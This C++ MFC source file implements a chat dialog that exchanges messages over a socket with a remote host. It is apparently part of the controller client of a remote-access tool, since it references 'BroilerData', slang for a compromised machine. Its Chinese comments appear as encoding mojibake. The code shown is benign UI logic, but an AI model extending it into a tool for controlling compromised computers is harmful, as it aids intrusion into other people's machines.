// ChatDlg.cpp : ʵ���ļ�
//

#include "stdafx.h"
#include "Client.h"
#include "ChatDlg.h"
#include "BroilerData.h"

// CChatDlg �Ի���

static const int nHotkey  = 2000;
 
IMPLEMENT_DYNAMIC(CChatDlg, CDialog)

CChatDlg::CChatDlg(CWnd* pParent /*=NULL*/ , SOCKET sock, CString strIP)
	: CDialog(CChatDlg::IDD, pParent)
{
	m_socket = sock;
	m_strChatMsg = _T("");
	m_strIP = strIP;
	m_bfirstSend = true;
	m_bQuit = false;  //Ĭ�Ϸ������û���˳�
	m_hIcon = AfxGetApp()->LoadIcon(IDI_ICON_CHATMSG);
}

CChatDlg::~CChatDlg()
{
}

void CChatDlg::DoDataExchange(CDataExchange* pDX)
{
	CDialog::DoDataExchange(pDX);
	DDX_Control(pDX, IDC_EDIT_CHAT_RECV, m_chatRecv);
	DDX_Control(pDX, IDC_EDIT_CHAT_SEND, m_chatSend);
}


BEGIN_MESSAGE_MAP(CChatDlg, CDialog)
	ON_BN_CLICKED(IDCANCEL, &CChatDlg::OnBnClickedCancel)
	ON_MESSAGE(WM_HOTKEY,&CChatDlg::OnHotKey)
	ON_WM_CTLCOLOR()
	ON_BN_CLICKED(IDC_BTN_SEND_MSG, &CChatDlg::OnBnClickedBtnSendMsg)
END_MESSAGE_MAP()


// CChatDlg ��Ϣ�������

BOOL CChatDlg::OnInitDialog()
{
	CDialog::OnInitDialog();

	// TODO:  �ڴ���Ӷ���ĳ�ʼ��
	SetIcon(m_hIcon, FALSE);
    DlgInit();
	return TRUE;  // return TRUE unless you set the focus to a control
	// �쳣: OCX ����ҳӦ���� FALSE
}

void CChatDlg::DlgInit()
{
	RegisterHotKey(this->GetSafeHwnd(), nHotkey, MOD_CONTROL, VK_RETURN);  //ע���ݼ�
	CString strTitle = _T("��ʹ����  \\\\");
	strTitle += m_strIP;
	SetWindowText(strTitle);
}

LRESULT CChatDlg::OnHotKey( WPARAM wParam,LPARAM lParam )
{
	if (nHotkey == wParam)
	{
		SendChatMsg();   //��������� Ctrl + Enter , ���͵�ǰ����Ϣ
	}
	return 0;
}

void CChatDlg::OnBnClickedBtnSendMsg()
{
	// TODO: �ڴ���ӿؼ�֪ͨ����������
	SendChatMsg();  //������Ϣ
}

void CChatDlg::OnBnClickedCancel()
{
	// TODO: �ڴ���ӿؼ�֪ͨ����������
	OnCancel();
}

void CChatDlg::SendChatMsg()
{
	CString strSendMsg = _T("");  //���͵���Ϣ
	GetDlgItemText(IDC_EDIT_CHAT_SEND, strSendMsg);
	if (strSendMsg.IsEmpty())  //���͵��ǿ�
	{
		return ;
	}
	CHATMSG_C tagChatMsg;
	memset(&tagChatMsg, 0, sizeof(CHATMSG_C));
	tagChatMsg.bfirstSend = m_bfirstSend;
	m_bfirstSend = false;
	tagChatMsg.bClose = false;
	wsprintfW(tagChatMsg.szChatMsg, strSendMsg);

	MSGINFO tagMsgInfo;
	memset(&tagMsgInfo, 0, sizeof(MSGINFO));
	tagMsgInfo.nMsgCmd = CMD_CHATMSG;        //����������Ϣ
	memcpy((char*)tagMsgInfo.context, (char*)&tagChatMsg, sizeof(CHATMSG_C));
	bool bSuccess = true;
	m_moduleSocket.SendCommand(m_socket, (char*)&tagMsgInfo, sizeof(MSGINFO), &bSuccess);
	if (bSuccess)
	{
		m_strChatMsg += _T("YourSelf: ");
		m_strChatMsg += strSendMsg;
		m_strChatMsg += _T("\r\n\r\n--------------------END---------------------\r\n\r\n");
		m_bQuit = false;   //�����Ƿ��˳���ֻҪ��������Ϣ���Ҷ��ԶԷ��Ĵ���һ��û�˳���
	}
	m_chatRecv.SetWindowText(m_strChatMsg);
	m_chatRecv.SetSel(-1);
	m_chatSend.SetWindowText(_T(""));  //���
}

void CChatDlg::RecvChatMsg(IN CHATMSG_C tagChatMsg)
{
	CString strRecvMsg = _T("");
	if (false == tagChatMsg.bClose)
	{
		strRecvMsg.Format(_T("С��: %s"), tagChatMsg.szChatMsg);
		m_strChatMsg += strRecvMsg;
		m_bQuit = false;
	}
	else   //����˹ر�������
	{
		CString strWarning = _T("�����: ");
		strWarning += m_strIP;
		strWarning += _T("�ر�����ʹ����!");
		m_strChatMsg += strWarning;
		m_bfirstSend = true;  //�ָ��˵�һ�η�����Ϣ��״̬
		m_bQuit = true;  //������˳���
	}
	m_strChatMsg += _T("\r\n\r\n--------------------END---------------------\r\n\r\n");
	m_chatRecv.SetWindowText(m_strChatMsg);
	m_chatRecv.SetSel(-1);
}

void CChatDlg::PostNcDestroy()
{
	// TODO: �ڴ����ר�ô����/����û���
	CDialog::PostNcDestroy();
	((CBroilerData*)this->m_pParentWnd)->m_pChatDlg = NULL;
}

void CChatDlg::OnCancel()
{
	// TODO: �ڴ����ר�ô����/����û���
    if (!m_bQuit)  //��������û���˳������Ҵ�ʱ����رգ��򽫷����ͬʱҲ�رա����������˳��ˣ������ٷ����˳���Ϣ
	{
		CHATMSG_C tagChatMsg;
		memset(&tagChatMsg, 0, sizeof(CHATMSG_C));
		tagChatMsg.bfirstSend = false;
		tagChatMsg.bClose = true;

		MSGINFO tagMsgInfo;
		memset(&tagMsgInfo, 0, sizeof(MSGINFO));
		tagMsgInfo.nMsgCmd = CMD_CHATMSG;        //����������Ϣ
		memcpy((char*)tagMsgInfo.context, (char*)&tagChatMsg, sizeof(CHATMSG_C));
		bool bSuccess = true;
		m_moduleSocket.SendCommand(m_socket, (char*)&tagMsgInfo, sizeof(MSGINFO), &bSuccess);
		Sleep(100);
	}
	UnregisterHotKey(GetSafeHwnd(), nHotkey);//ע��Ctrl+Enter�� 
	DestroyWindow();
	delete this;
}

HBRUSH CChatDlg::OnCtlColor(CDC* pDC, CWnd* pWnd, UINT nCtlColor)
{
	HBRUSH hbr = CDialog::OnCtlColor(pDC, pWnd, nCtlColor);

	// TODO:  �ڴ˸��� DC ���κ�����
	if (IDC_STATIC_CHAT_TIPS == pWnd->GetDlgCtrlID() && CTLCOLOR_STATIC == nCtlColor)
	{
		pDC->SetTextColor(RGB(255,0,0));   //������ɫ
		pDC->SetBkMode(TRANSPARENT);
	}
	// TODO:  ���Ĭ�ϵĲ������軭�ʣ��򷵻���һ������
	return hbr;
}

BOOL CChatDlg::PreTranslateMessage(MSG* pMsg)
{
	// TODO: �ڴ����ר�ô����/����û���
	if ( WM_KEYDOWN == pMsg->message)
	{
		int nVirtKey = (int)pMsg->wParam;
		if (VK_RETURN == nVirtKey || VK_ESCAPE == nVirtKey)  //������µ��ǻس�����ESC������ض���Ϣ
		{
			return TRUE;
		}
	}
	return CDialog::PreTranslateMessage(pMsg);
}
